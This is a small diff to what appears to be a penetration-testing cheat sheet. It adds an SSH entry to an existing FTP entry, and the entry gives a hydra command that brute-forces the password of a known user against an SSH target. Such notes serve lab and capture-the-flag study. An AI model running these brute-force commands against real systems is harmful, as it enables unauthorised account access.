@@ -14,6 +14,10 @@ Service
 	* Brute force pasword with known username using [`hydra`](https://tools.kali.org/password-attacks/hydra)
 	* `hydra -l <username> -P <wordlist> <target-address> ftp`
 
+* `SSH`
+	
+	* Brute force pasword with known username using [`hydra`](https://tools.kali.org/password-attacks/hydra)
+	* `hydra -t 4 -l jan -P <wordlist> ssh://<target-address>`
 
 ZIP
 -----------------------
